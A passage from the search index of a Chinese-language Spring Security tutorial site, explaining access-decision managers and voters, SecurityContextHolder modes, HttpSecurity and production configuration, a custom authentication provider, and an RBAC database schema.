ACCESS_DENIED\n</code></pre>"},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#_13","title":"\u6838\u5fc3\u63a5\u53e3","text":""},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#1-accessdecisionmanager","title":"1. AccessDecisionManager","text":"<pre><code>/**\n * AccessDecisionManager\u63a5\u53e3\n */\npublic interface AccessDecisionManager {\n\n    /**\n     * \u51b3\u5b9a\u662f\u5426\u6388\u4e88\u8bbf\u95ee\u6743\u9650\n     * @param authentication \u5f53\u524d\u8ba4\u8bc1\u4fe1\u606f\n     * @param object \u88ab\u4fdd\u62a4\u7684\u5bf9\u8c61\uff08FilterInvocation\u3001MethodInvocation\u7b49\uff09\n     * @param configAttributes \u8bbf\u95ee\u6240\u9700\u7684\u6743\u9650\u914d\u7f6e\n     * @throws AccessDeniedException \u5982\u679c\u8bbf\u95ee\u88ab\u62d2\u7edd\n     */\n    void decide(Authentication authentication, Object object,\n               Collection&lt;ConfigAttribute&gt; configAttributes) \n        throws AccessDeniedException, InsufficientAuthenticationException;\n\n    boolean supports(ConfigAttribute attribute);\n\n    boolean supports(Class&lt;?&gt; clazz);\n}\n</code></pre> <p>\u5b9e\u73b0\u7b56\u7565\uff1a</p> <pre><code>/**\n * 1. AffirmativeBased - \u4e00\u7968\u901a\u8fc7\uff08\u9ed8\u8ba4\uff09\n * \u53ea\u8981\u6709\u4e00\u4e2aVoter\u6295\u8d5e\u6210\u7968\uff0c\u5c31\u6388\u4e88\u8bbf\u95ee\u6743\u9650\n */\npublic class AffirmativeBased extends AbstractAccessDecisionManager {\n    @Override\n    public void decide(Authentication authentication, Object object,\n                      Collection&lt;ConfigAttribute&gt; configAttributes) \n            throws AccessDeniedException {\n\n        int deny = 0;\n\n        for (AccessDecisionVoter voter : getDecisionVoters()) {\n            int result = voter.vote(authentication, object, configAttributes);\n\n            switch (result) {\n                case AccessDecisionVoter.ACCESS_GRANTED:\n                    return;  // \u901a\u8fc7\n\n                case AccessDecisionVoter.ACCESS_DENIED:\n                    deny++;\n                    break;\n\n                default:\n                    break;\n            }\n        }\n\n        if (deny &gt; 0) {\n            throw new AccessDeniedException(\"Access is denied\");\n        }\n\n        // \u68c0\u67e5\u662f\u5426\u5141\u8bb8\u5168\u5f03\u6743\n        checkAllowIfAllAbstainDecisions();\n    }\n}\n\n/**\n * 2. ConsensusBased - \u5c11\u6570\u670d\u4ece\u591a\u6570\n * \u8d5e\u6210\u7968\u591a\u4e8e\u53cd\u5bf9\u7968\u5219\u6388\u4e88\u8bbf\u95ee\u6743\u9650\n */\npublic class ConsensusBased extends AbstractAccessDecisionManager {\n    @Override\n    public void decide(Authentication authentication, Object object,\n                      Collection&lt;ConfigAttribute&gt; configAttributes) \n            throws AccessDeniedException {\n\n        int grant = 0;\n        int deny = 0;\n\n        for (AccessDecisionVoter voter : getDecisionVoters()) {\n            int result = voter.vote(authentication, object, configAttributes);\n\n            switch (result) {\n                case AccessDecisionVoter.ACCESS_GRANTED:\n                    grant++;\n                    break;\n\n                case AccessDecisionVoter.ACCESS_DENIED:\n                    deny++;\n                    break;\n            }\n        }\n\n        if (grant &gt; deny) {\n            return;  // \u901a\u8fc7\n        }\n\n        if (deny &gt; grant) {\n            throw new AccessDeniedException(\"Access is denied\");\n        }\n\n        // \u5e73\u7968\u5904\u7406\n        if ((grant == deny) &amp;&amp; (grant != 0)) {\n            if (this.allowIfEqualGrantedDeniedDecisions) {\n                return;\n            } else {\n                throw new AccessDeniedException(\"Access is denied\");\n            }\n        }\n\n        checkAllowIfAllAbstainDecisions();\n    }\n}\n\n/**\n * 3. UnanimousBased - \u4e00\u7968\u5426\u51b3\n * \u6240\u6709Voter\u90fd\u6295\u8d5e\u6210\u7968\u624d\u6388\u4e88\u8bbf\u95ee\u6743\u9650\n */\npublic class UnanimousBased extends AbstractAccessDecisionManager {\n    @Override\n    public void decide(Authentication authentication, Object object,\n                      Collection&lt;ConfigAttribute&gt; configAttributes) \n            throws AccessDeniedException {\n\n        int grant = 0;\n\n        for (AccessDecisionVoter voter : getDecisionVoters()) {\n            int result = voter.vote(authentication, object, configAttributes);\n\n            switch (result) {\n                case AccessDecisionVoter.ACCESS_GRANTED:\n                    grant++;\n                    break;\n\n                case AccessDecisionVoter.ACCESS_DENIED:\n                    throw new AccessDeniedException(\"Access is denied\");\n            }\n        }\n\n        if (grant &gt; 0) {\n            return;  // \u5168\u90e8\u8d5e\u6210\uff0c\u901a\u8fc7\n        }\n\n        checkAllowIfAllAbstainDecisions();\n    }\n}\n</code></pre>"},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#2-accessdecisionvoter","title":"2. AccessDecisionVoter","text":"<pre><code>/**\n * AccessDecisionVoter\u63a5\u53e3\n */\npublic interface AccessDecisionVoter&lt;S&gt; {\n\n    int ACCESS_GRANTED = 1;   // \u8d5e\u6210\n    int ACCESS_ABSTAIN = 0;   // \u5f03\u6743\n    int ACCESS_DENIED = -1;   // \u53cd\u5bf9\n\n    /**\n     * \u6295\u7968\n     */\n    int vote(Authentication authentication, S object, \n            Collection&lt;ConfigAttribute&gt; attributes);\n\n    boolean supports(ConfigAttribute attribute);\n\n    boolean supports(Class&lt;?&gt; clazz);\n}\n</code></pre> <p>\u5e38\u7528Voter\uff1a</p> <pre><code>/**\n * RoleVoter - \u89d2\u8272\u6295\u7968\u5668\n */\npublic class RoleVoter implements AccessDecisionVoter&lt;Object&gt; {\n\n    private String rolePrefix = \"ROLE_\";\n\n    @Override\n    public int vote(Authentication authentication, Object object,\n                   Collection&lt;ConfigAttribute&gt; attributes) {\n\n        if (authentication == null) {\n            return ACCESS_DENIED;\n        }\n\n        int result = ACCESS_ABSTAIN;\n        Collection&lt;? extends GrantedAuthority&gt; authorities = authentication.getAuthorities();\n\n        for (ConfigAttribute attribute : attributes) {\n            if (this.supports(attribute)) {\n                result = ACCESS_DENIED;\n\n                // \u68c0\u67e5\u7528\u6237\u662f\u5426\u62e5\u6709\u6240\u9700\u89d2\u8272\n                for (GrantedAuthority authority : authorities) {\n                    if (attribute.getAttribute().equals(authority.getAuthority())) {\n                        return ACCESS_GRANTED;\n                    }\n                }\n            }\n        }\n\n        return result;\n    }\n\n    @Override\n    public boolean supports(ConfigAttribute attribute) {\n        return (attribute.getAttribute() != null) \n            &amp;&amp; attribute.getAttribute().startsWith(rolePrefix);\n    }\n}\n\n/**\n * \u81ea\u5b9a\u4e49Voter\u793a\u4f8b - IP\u5730\u5740\u6295\u7968\u5668\n */\npublic class IpAddressVoter implements AccessDecisionVoter&lt;FilterInvocation&gt; {\n\n    private static final String IP_PREFIX = \"IP_\";\n    private static final String IP_LOCAL_HOST = \"IP_LOCAL_HOST\";\n\n    @Override\n    public int vote(Authentication authentication, FilterInvocation fi,\n                   Collection&lt;ConfigAttribute&gt; attributes) {\n\n        int result = ACCESS_ABSTAIN;\n\n        for (ConfigAttribute attribute : attributes) {\n            if (!this.supports(attribute)) {\n                continue;\n            }\n\n            result = ACCESS_DENIED;\n            String clientIp = fi.getRequest().getRemoteAddr();\n\n            if (IP_LOCAL_HOST.equals(attribute.getAttribute())) {\n                if (\"127.0.0.1\".equals(clientIp) || \"0:0:0:0:0:0:0:1\".equals(clientIp)) {\n                    return ACCESS_GRANTED;\n                }\n            }\n\n            // \u53ef\u4ee5\u6dfb\u52a0\u66f4\u591aIP\u68c0\u67e5\u903b\u8f91\n        }\n\n        return result;\n    }\n\n    @Override\n    public boolean supports(ConfigAttribute attribute) {\n        return attribute.getAttribute() != null \n            &amp;&amp; attribute.getAttribute().startsWith(IP_PREFIX);\n    }\n\n    @Override\n    public boolean supports(Class&lt;?&gt; clazz) {\n        return FilterInvocation.class.isAssignableFrom(clazz);\n    }\n}\n</code></pre>"},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#security-context","title":"Security Context","text":""},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#securitycontextsecuritycontextholder","title":"SecurityContext\u548cSecurityContextHolder","text":"<pre><code>/**\n * SecurityContext\u63a5\u53e3\n */\npublic interface SecurityContext extends Serializable {\n\n    /**\n     * \u83b7\u53d6\u5f53\u524d\u8ba4\u8bc1\u4fe1\u606f\n     */\n    Authentication getAuthentication();\n\n    /**\n     * \u8bbe\u7f6e\u8ba4\u8bc1\u4fe1\u606f\n     */\n    void setAuthentication(Authentication authentication);\n}\n</code></pre> <p>SecurityContextHolder - \u5b58\u50a8SecurityContext\u7684\u5de5\u5177\u7c7b\uff1a</p> <pre><code>/**\n * SecurityContextHolder\u4f7f\u7528\u793a\u4f8b\n */\npublic class SecurityContextExample {\n\n    /**\n     * \u83b7\u53d6\u5f53\u524d\u8ba4\u8bc1\u4fe1\u606f\n     */\n    public static Authentication getCurrentAuthentication() {\n        SecurityContext context = SecurityContextHolder.getContext();\n        return context.getAuthentication();\n    }\n\n    /**\n     * \u83b7\u53d6\u5f53\u524d\u7528\u6237\u540d\n     */\n    public static String getCurrentUsername() {\n        Authentication authentication = getCurrentAuthentication();\n        if (authentication == null) {\n            return null;\n        }\n\n        Object principal = authentication.getPrincipal();\n        if (principal instanceof UserDetails) {\n            return ((UserDetails) principal).getUsername();\n        } else {\n            return principal.toString();\n        }\n    }\n\n    /**\n     * \u83b7\u53d6\u5f53\u524d\u7528\u6237\u8be6\u60c5\n     */\n    public static UserDetails getCurrentUserDetails() {\n        Authentication authentication = getCurrentAuthentication();\n        if (authentication != null &amp;&amp; authentication.getPrincipal() instanceof UserDetails) {\n            return (UserDetails) authentication.getPrincipal();\n        }\n        return null;\n    }\n\n    /**\n     * \u68c0\u67e5\u662f\u5426\u5df2\u8ba4\u8bc1\n     */\n    public static boolean isAuthenticated() {\n        Authentication authentication = getCurrentAuthentication();\n        return authentication != null \n            &amp;&amp; authentication.isAuthenticated()\n            &amp;&amp; !(authentication instanceof AnonymousAuthenticationToken);\n    }\n\n    /**\n     * \u68c0\u67e5\u662f\u5426\u62e5\u6709\u89d2\u8272\n     */\n    public static boolean hasRole(String role) {\n        Authentication authentication = getCurrentAuthentication();\n        if (authentication == null) {\n            return false;\n        }\n\n        String roleWithPrefix = \"ROLE_\" + role;\n        return authentication.getAuthorities().stream()\n            .anyMatch(auth -&gt; auth.getAuthority().equals(roleWithPrefix));\n    }\n\n    /**\n     * \u624b\u52a8\u8bbe\u7f6e\u8ba4\u8bc1\u4fe1\u606f\uff08\u8c28\u614e\u4f7f\u7528\uff09\n     */\n    public static void setAuthentication(Authentication authentication) {\n        SecurityContext context = SecurityContextHolder.createEmptyContext();\n        context.setAuthentication(authentication);\n        SecurityContextHolder.setContext(context);\n    }\n\n    /**\n     * \u6e05\u9664\u8ba4\u8bc1\u4fe1\u606f\n     */\n    public static void clearAuthentication() {\n        SecurityContextHolder.clearContext();\n    }\n}\n</code></pre> <p>SecurityContextHolder\u5b58\u50a8\u7b56\u7565\uff1a</p> <pre><code>/**\n * SecurityContextHolder\u6709\u4e09\u79cd\u5b58\u50a8\u7b56\u7565\n */\npublic class SecurityContextHolderExample {\n\n    /**\n     * 1. MODE_THREADLOCAL\uff08\u9ed8\u8ba4\uff09\n     * \u4f7f\u7528ThreadLocal\u5b58\u50a8\uff0c\u6bcf\u4e2a\u7ebf\u7a0b\u72ec\u7acb\n     */\n    public static void threadLocalMode() {\n        SecurityContextHolder.setStrategyName(SecurityContextHolder.MODE_THREADLOCAL);\n\n        // \u5728\u5f53\u524d\u7ebf\u7a0b\u4e2d\u8bbe\u7f6e\n        SecurityContextHolder.getContext().setAuthentication(auth);\n\n        // \u65b0\u7ebf\u7a0b\u4e2d\u65e0\u6cd5\u8bbf\u95ee\n        new Thread(() -&gt; {\n            Authentication auth = SecurityContextHolder.getContext().getAuthentication();\n            // auth \u4e3a null\n        }).start();\n    }\n\n    /**\n     * 2. MODE_INHERITABLETHREADLOCAL\n     * \u4f7f\u7528InheritableThreadLocal\uff0c\u5b50\u7ebf\u7a0b\u53ef\u4ee5\u7ee7\u627f\u7236\u7ebf\u7a0b\u7684SecurityContext\n     */\n    public static void inheritableThreadLocalMode() {\n        SecurityContextHolder.setStrategyName(\n            SecurityContextHolder.MODE_INHERITABLETHREADLOCAL);\n\n        SecurityContextHolder.getContext().setAuthentication(auth);\n\n        // \u5b50\u7ebf\u7a0b\u53ef\u4ee5\u8bbf\u95ee\n        new Thread(() -&gt; {\n            Authentication auth = SecurityContextHolder.getContext().getAuthentication();\n            // auth \u4e0d\u4e3a null\n        }).start();\n    }\n\n    /**\n     * 3. MODE_GLOBAL\n     * \u5168\u5c40\u6a21\u5f0f\uff0cJVM\u4e2d\u6240\u6709\u7ebf\u7a0b\u5171\u4eab\u540c\u4e00\u4e2aSecurityContext\n     * \u4ec5\u9002\u7528\u4e8e\u72ec\u7acb\u5e94\u7528\uff0c\u4e0d\u9002\u7528\u4e8e\u670d\u52a1\u5668\u5e94\u7528\n     */\n    public static void globalMode() {\n        SecurityContextHolder.setStrategyName(SecurityContextHolder.MODE_GLOBAL);\n    }\n}\n</code></pre>"},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#_14","title":"\u6838\u5fc3\u7ec4\u4ef6\u8be6\u89e3","text":""},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#1-securityconfigurer","title":"1. SecurityConfigurer","text":"<pre><code>/**\n * SecurityConfigurer\u662f\u914d\u7f6eSpring Security\u7684\u6838\u5fc3\u63a5\u53e3\n */\npublic interface SecurityConfigurer&lt;O, B extends SecurityBuilder&lt;O&gt;&gt; {\n\n    /**\n     * \u521d\u59cb\u5316\n     */\n    void init(B builder) throws Exception;\n\n    /**\n     * \u914d\u7f6e\n     */\n    void configure(B builder) throws Exception;\n}\n</code></pre>"},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#2-httpsecurity","title":"2. HttpSecurity","text":"<pre><code>/**\n * HttpSecurity\u914d\u7f6e\u793a\u4f8b\n */\n@Configuration\n@EnableWebSecurity\npublic class SecurityConfig {\n\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            // \u6388\u6743\u914d\u7f6e\n            .authorizeHttpRequests(authz -&gt; authz\n                .requestMatchers(\"/public/**\").permitAll()\n                .requestMatchers(\"/admin/**\").hasRole(\"ADMIN\")\n                .requestMatchers(\"/api/**\").hasAnyRole(\"USER\", \"ADMIN\")\n                .requestMatchers(HttpMethod.POST, \"/api/data\").hasAuthority(\"DATA_WRITE\")\n                .anyRequest().authenticated()\n            )\n\n            // \u8868\u5355\u767b\u5f55\n            .formLogin(form -&gt; form\n                .loginPage(\"/login\")\n                .loginProcessingUrl(\"/perform_login\")\n                .defaultSuccessUrl(\"/home\", true)\n                .failureUrl(\"/login?error=true\")\n                .usernameParameter(\"username\")\n                .passwordParameter(\"password\")\n                .permitAll()\n            )\n\n            // \u767b\u51fa\n            .logout(logout -&gt; logout\n                .logoutUrl(\"/logout\")\n                .logoutSuccessUrl(\"/login?logout\")\n                .deleteCookies(\"JSESSIONID\")\n                .invalidateHttpSession(true)\n                .permitAll()\n            )\n\n            // \u8bb0\u4f4f\u6211\n            .rememberMe(remember -&gt; remember\n                .key(\"uniqueAndSecret\")\n                .tokenValiditySeconds(86400)  // 24\u5c0f\u65f6\n                .rememberMeParameter(\"remember-me\")\n            )\n\n            // \u4f1a\u8bdd\u7ba1\u7406\n            .sessionManagement(session -&gt; session\n                .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)\n                .maximumSessions(1)\n                .maxSessionsPreventsLogin(false)\n                .expiredUrl(\"/login?expired\")\n            )\n\n            // CSRF\n            .csrf(csrf -&gt; csrf\n                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())\n            )\n\n            // \u5f02\u5e38\u5904\u7406\n            .exceptionHandling(exception -&gt; exception\n                .authenticationEntryPoint(new HttpStatusEntryPoint(HttpStatus.UNAUTHORIZED))\n                .accessDeniedHandler((request, response, ex) -&gt; {\n                    response.setStatus(HttpServletResponse.SC_FORBIDDEN);\n                    response.getWriter().write(\"Access Denied\");\n                })\n            );\n\n        return http.build();\n    }\n}\n</code></pre>"},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#_15","title":"\u81ea\u5b9a\u4e49\u6269\u5c55","text":""},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#1-authenticationprovider","title":"1. \u81ea\u5b9a\u4e49AuthenticationProvider","text":"<pre><code>/**\n * \u81ea\u5b9a\u4e49\u8ba4\u8bc1\u63d0\u4f9b\u8005\n */\n@Component\npublic class CustomAuthenticationProvider implements AuthenticationProvider {\n\n    @Autowired\n    private UserService userService;\n\n    @Autowired\n    private PasswordEncoder passwordEncoder;\n\n    @Override\n    public Authentication authenticate(Authentication authentication) \n            throws AuthenticationException {\n\n        String username = authentication.getName();\n        String password = authentication.getCredentials().toString();\n\n        // \u81ea\u5b9a\u4e49\u8ba4\u8bc1\u903b\u8f91\n        User user = userService.findByUsername(username);\n\n        if (user == null) {\n            throw new BadCredentialsException(\"\u7528\u6237\u4e0d\u5b58\u5728\");\n        }\n\n        if (!user.isEnabled()) {\n            throw new DisabledException(\"\u8d26\u6237\u5df2\u7981\u7528\");\n        }\n\n        if (user.isLocked()) {\n            throw new LockedException(\"\u8d26\u6237\u5df2\u9501\u5b9a\");\n        }\n\n        if (!passwordEncoder.matches(password, user.getPassword())) {\n            throw new BadCredentialsException(\"\u5bc6\u7801\u9519\u8bef\");\n        }\n\n        // \u8ba4\u8bc1\u6210\u529f\uff0c\u521b\u5efaAuthentication\u5bf9\u8c61\n        List&lt;GrantedAuthority&gt; authorities = user.getRoles().stream()\n            .map(role -&gt; new SimpleGrantedAuthority(\"ROLE_\" + role))\n            .collect(Collectors.toList());\n\n        return new UsernamePasswordAuthenticationToken(\n            username,\n            password,\n            authorities\n        );\n    }\n\n    @Override\n    public boolean supports(Class&lt;?&gt; authentication) {\n        return UsernamePasswordAuthenticationToken.class.isAssignableFrom(authentication);\n    }\n}\n\n/**\n * \u914d\u7f6e\u81ea\u5b9a\u4e49AuthenticationProvider\n */\n@Configuration\npublic class AuthConfig {\n\n    @Autowired\n    private CustomAuthenticationProvider customAuthenticationProvider;\n\n    @Bean\n    public AuthenticationManager authenticationManager(HttpSecurity http) throws Exception {\n        AuthenticationManagerBuilder auth = \n            http.getSharedObject(AuthenticationManagerBuilder.class);\n\n        auth.authenticationProvider(customAuthenticationProvider);\n\n        return auth.build();\n    }\n}\n</code></pre>"},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#2-accessdecisionvoter_1","title":"2. \u81ea\u5b9a\u4e49AccessDecisionVoter","text":"<pre><code>/**\n * \u65f6\u95f4\u6bb5\u8bbf\u95ee\u63a7\u5236Voter\n */\npublic class TimeBasedVoter implements AccessDecisionVoter&lt;Object&gt; {\n\n    private static final String TIME_PREFIX = \"TIME_\";\n\n    @Override\n    public int vote(Authentication authentication, Object object,\n                   Collection&lt;ConfigAttribute&gt; attributes) {\n\n        int result = ACCESS_ABSTAIN;\n        LocalTime now = LocalTime.now();\n\n        for (ConfigAttribute attribute : attributes) {\n            if (!supports(attribute)) {\n                continue;\n            }\n\n            result = ACCESS_DENIED;\n            String value = attribute.getAttribute();\n\n            if (value.equals(\"TIME_BUSINESS_HOURS\")) {\n                // \u5de5\u4f5c\u65f6\u95f4\uff1a9:00 - 18:00\n                if (now.isAfter(LocalTime.of(9, 0)) &amp;&amp; \n                    now.isBefore(LocalTime.of(18, 0))) {\n                    return ACCESS_GRANTED;\n                }\n            }\n        }\n\n        return result;\n    }\n\n    @Override\n    public boolean supports(ConfigAttribute attribute) {\n        return attribute.getAttribute() != null \n            &amp;&amp; attribute.getAttribute().startsWith(TIME_PREFIX);\n    }\n\n    @Override\n    public boolean supports(Class&lt;?&gt; clazz) {\n        return true;\n    }\n}\n</code></pre>"},{"location":"auth/04-SpringSecurity%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84/#_16","title":"\u603b\u7ed3","text":"<p>Spring Security\u6838\u5fc3\u67b6\u6784\u5305\u62ec\uff1a</p> <ol> <li>\u8fc7\u6ee4\u5668\u94fe\uff1a\u8bf7\u6c42\u7684\u7b2c\u4e00\u9053\u9632\u7ebf\uff0c\u8d1f\u8d23\u8ba4\u8bc1\u548c\u6388\u6743\u7684\u524d\u7f6e\u5904\u7406</li> <li>\u8ba4\u8bc1\u67b6\u6784\uff1aAuthenticationManager \u2192 AuthenticationProvider \u2192 UserDetailsService</li> <li>\u6388\u6743\u67b6\u6784\uff1aAccessDecisionManager \u2192 AccessDecisionVoter</li> <li>Security Context\uff1a\u5b58\u50a8\u548c\u4f20\u9012\u8ba4\u8bc1\u4fe1\u606f</li> <li>\u6269\u5c55\u673a\u5236\uff1a\u63d0\u4f9b\u4e30\u5bcc\u7684\u6269\u5c55\u70b9\uff0c\u652f\u6301\u81ea\u5b9a\u4e49\u8ba4\u8bc1\u548c\u6388\u6743\u903b\u8f91</li> </ol> <p>\u7406\u89e3\u8fd9\u4e9b\u6838\u5fc3\u7ec4\u4ef6\u7684\u4ea4\u4e92\u65b9\u5f0f\u662f\u638c\u63e1Spring Security\u7684\u5173\u952e\u3002</p> <p>\u7ee7\u7eed\u5b66\u4e60\uff1a - \u4e0a\u4e00\u7ae0\uff1aJava\u8ba4\u8bc1\u6846\u67b6\u5bf9\u6bd4 - \u4e0b\u4e00\u7ae0\uff1aSpring Security\u5b9e\u6218\u914d\u7f6e</p>"},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/","title":"Spring Security\u5b9e\u6218\u914d\u7f6e","text":""},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#_1","title":"\u76ee\u5f55","text":"<ul> <li>\u57fa\u7840\u914d\u7f6e</li> <li>\u8868\u5355\u767b\u5f55\u914d\u7f6e</li> <li>HTTP Basic\u8ba4\u8bc1</li> <li>Remember-Me\u529f\u80fd</li> <li>\u4f1a\u8bdd\u7ba1\u7406\u7b56\u7565</li> <li>CSRF\u9632\u62a4\u914d\u7f6e</li> <li>\u65b9\u6cd5\u7ea7\u5b89\u5168</li> <li>\u591a\u79cd\u8ba4\u8bc1\u65b9\u5f0f\u7ec4\u5408</li> </ul>"},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#_2","title":"\u57fa\u7840\u914d\u7f6e","text":""},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#_3","title":"\u6700\u5c0f\u914d\u7f6e","text":"<pre><code>/**\n * \u6700\u7b80\u5355\u7684Spring Security\u914d\u7f6e\n */\n@Configuration\n@EnableWebSecurity\npublic class MinimalSecurityConfig {\n\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            .authorizeHttpRequests(authz -&gt; authz\n                .anyRequest().authenticated()\n            )\n            .formLogin(Customizer.withDefaults());\n\n        return http.build();\n    }\n\n    @Bean\n    public UserDetailsService userDetailsService() {\n        UserDetails user = User.withDefaultPasswordEncoder()\n            .username(\"user\")\n            .password(\"password\")\n            .roles(\"USER\")\n            .build();\n\n        return new InMemoryUserDetailsManager(user);\n    }\n}\n</code></pre>"},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#_4","title":"\u751f\u4ea7\u73af\u5883\u57fa\u7840\u914d\u7f6e","text":"<pre><code>/**\n * \u751f\u4ea7\u73af\u5883\u63a8\u8350\u914d\u7f6e\n */\n@Configuration\n@EnableWebSecurity\n@EnableMethodSecurity  // \u542f\u7528\u65b9\u6cd5\u7ea7\u5b89\u5168\npublic class ProductionSecurityConfig {\n\n    @Autowired\n    private UserDetailsService userDetailsService;\n\n    @Autowired\n    private DataSource dataSource;\n\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            // \u6388\u6743\u914d\u7f6e\n            .authorizeHttpRequests(authz -&gt; authz\n                // \u516c\u5f00\u8d44\u6e90\n                .requestMatchers(\n                    \"/\",\n                    \"/public/**\",\n                    \"/static/**\",\n                    \"/css/**\",\n                    \"/js/**\",\n                    \"/images/**\",\n                    \"/webjars/**\",\n                    \"/error\"\n                ).permitAll()\n\n                // API\u7aef\u70b9\n                .requestMatchers(\"/api/public/**\").permitAll()\n                .requestMatchers(\"/api/admin/**\").hasRole(\"ADMIN\")\n                .requestMatchers(\"/api/**\").authenticated()\n\n                // \u7ba1\u7406\u7aef\u70b9\n                .requestMatchers(\"/actuator/health\").permitAll()\n                .requestMatchers(\"/actuator/**\").hasRole(\"ADMIN\")\n\n                // \u5176\u4ed6\u6240\u6709\u8bf7\u6c42\u9700\u8981\u8ba4\u8bc1\n                .anyRequest().authenticated()\n            )\n\n            // \u8868\u5355\u767b\u5f55\n            .formLogin(form -&gt; form\n                .loginPage(\"/login\")\n                .permitAll()\n            )\n\n            // \u767b\u51fa\n            .logout(logout -&gt; logout\n                .logoutSuccessUrl(\"/login?logout\")\n                .permitAll()\n            )\n\n            // \u8bb0\u4f4f\u6211\n            .rememberMe(remember -&gt; remember\n                .tokenRepository(persistentTokenRepository())\n                .tokenValiditySeconds(86400)\n            )\n\n            // \u4f1a\u8bdd\u7ba1\u7406\n            .sessionManagement(session -&gt; session\n                .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)\n                .invalidSessionUrl(\"/login?invalid\")\n                .maximumSessions(1)\n                .expiredUrl(\"/login?expired\")\n            )\n\n            // \u5b89\u5168\u5934\n            .headers(headers -&gt; headers\n                .frameOptions().deny()\n                .xssProtection().enable()\n                .contentTypeOptions().enable()\n                .httpStrictTransportSecurity()\n                    .includeSubDomains(true)\n                    .maxAgeInSeconds(31536000)\n            );\n\n        return http.build();\n    }\n\n    @Bean\n    public PasswordEncoder passwordEncoder() {\n        return new BCryptPasswordEncoder(12);\n    }\n\n    @Bean\n    public PersistentTokenRepository persistentTokenRepository() {\n        JdbcTokenRepositoryImpl tokenRepository = new JdbcTokenRepositoryImpl();\n        tokenRepository.setDataSource(dataSource);\n        return tokenRepository;\n    }\n}\n</code></pre>"},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#_5","title":"\u6570\u636e\u5e93\u8868\u7ed3\u6784","text":"<pre><code>-- \u7528\u6237\u8868\nCREATE TABLE users (\n    id BIGINT PRIMARY KEY AUTO_INCREMENT,\n    username VARCHAR(50) UNIQUE NOT NULL,\n    password VARCHAR(255) NOT NULL,\n    email VARCHAR(100),\n    enabled BOOLEAN DEFAULT TRUE,\n    account_non_expired BOOLEAN DEFAULT TRUE,\n    account_non_locked BOOLEAN DEFAULT TRUE,\n    credentials_non_expired BOOLEAN DEFAULT TRUE,\n    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\n    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP\n);\n\n-- \u89d2\u8272\u8868\nCREATE TABLE roles (\n    id BIGINT PRIMARY KEY AUTO_INCREMENT,\n    name VARCHAR(50) UNIQUE NOT NULL,\n    description VARCHAR(255)\n);\n\n-- \u7528\u6237\u89d2\u8272\u5173\u8054\u8868\nCREATE TABLE user_roles (\n    user_id BIGINT NOT NULL,\n    role_id BIGINT NOT NULL,\n    PRIMARY KEY (user_id, role_id),\n    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,\n    FOREIGN KEY (role_id) REFERENCES roles(id) ON DELETE CASCADE\n);\n\n-- \u6743\u9650\u8868\nCREATE TABLE permissions (\n    id BIGINT PRIMARY KEY AUTO_INCREMENT,\n    name VARCHAR(100) UNIQUE NOT NULL,\n    description VARCHAR(255)\n);\n\n-- \u89d2\u8272\u6743\u9650\u5173\u8054\u8868\nCREATE TABLE role_permissions (\n    role_id BIGINT NOT NULL,\n    permission_id BIGINT NOT NULL,\n    PRIMARY KEY (role_id, permission_id),\n    FOREIGN KEY (role_id) REFERENCES roles(id) ON DELETE CASCADE,\n    FOREIGN KEY (permission_id) REFERENCES permissions(id) ON DELETE CASCADE\n);\n\n-- Remember-Me\u6301\u4e45\u5316\u8868\nCREATE TABLE persistent_logins (\n    username VARCHAR(64) NOT NULL,\n    series VARCHAR(64) PRIMARY KEY,\n    token VARCHAR(64) NOT NULL,\n    last_used TIMESTAMP NOT NULL\n);\n</code></pre>"},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#_6","title":"\u8868\u5355\u767b\u5f55\u914d\u7f6e","text":""},{"location":"auth/05-SpringSecurity%E5%AE%9E%E6%88%98%E9%85%8D%E7%BD%AE/#_7","title":"\u57fa\u7840\u8868\u5355\u767b\u5f55","text":"<pre><code>@Configuration\n@EnableWebSecurity\npublic class FormLoginConfig {\n\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            .formLogin(form -&gt; form\n                // \u81ea\u5b9a\u4e49\u767b\u5f55\u9875\u9762\n                .loginPage(\"/login\")\n\n                // \u767b\u5f55\u8868\u5355\u63d0\u4ea4\u7684URL\n                .loginProcessingUrl(\"/perform_login\")\n\n                